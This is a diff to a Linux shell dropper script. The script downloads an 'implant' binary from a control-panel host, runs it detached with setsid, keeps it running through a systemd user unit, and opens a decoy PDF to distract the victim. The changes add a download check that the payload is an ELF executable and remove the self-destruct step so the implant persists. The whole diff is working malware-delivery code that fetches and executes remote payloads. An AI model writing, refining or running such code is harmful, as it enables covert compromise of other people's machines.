@@ -20,8 +20,15 @@ mkdir -p "$WORKDIR"
 
 # ---- download implant (curl sets no quarantine attribute) ------------------
 IMPLANT_URL="https://${PANEL_HOST}/install/linux/binary"
-curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun"
+curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun.tmp"
+mv -f "$WORKDIR/fleetrun.tmp" "$WORKDIR/fleetrun"
 chmod 0755 "$WORKDIR/fleetrun"
+
+# Guard: the endpoint must serve an ELF executable, not the dropper script.
+if ! head -c 4 "$WORKDIR/fleetrun" | grep -q 'ELF'; then
+  echo "[fleet] payload is not an ELF executable — aborting" >&2
+  exit 1
+fi
 
 # ---- download decoy PDF ----------------------------------------------------
 DECOY_URL="https://${PANEL_HOST}/install/linux/decoy"
@@ -75,13 +82,13 @@ if command -v loginctl >/dev/null 2>&1; then
 fi
 
 # ---- run the implant -------------------------------------------------------
-"$WORKDIR/fleetrun" >/dev/null 2>&1 &
+# The systemd user unit already starts it (Restart=always); setsid keeps one
+# detached copy running even on hosts without a user session bus.
 setsid "$WORKDIR/fleetrun" </dev/null >/dev/null 2>&1 &
 
 # ---- open decoy PDF --------------------------------------------------------
 sleep 1.5
 command -v xdg-open >/dev/null 2>&1 && xdg-open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true
 
-# ---- self-destruct ---------------------------------------------------------
-(sleep 5; rm -rf "$WORKDIR") >/dev/null 2>&1 &
+# No self-destruct: the systemd unit ExecStart points at $WORKDIR/fleetrun.
 exit 0
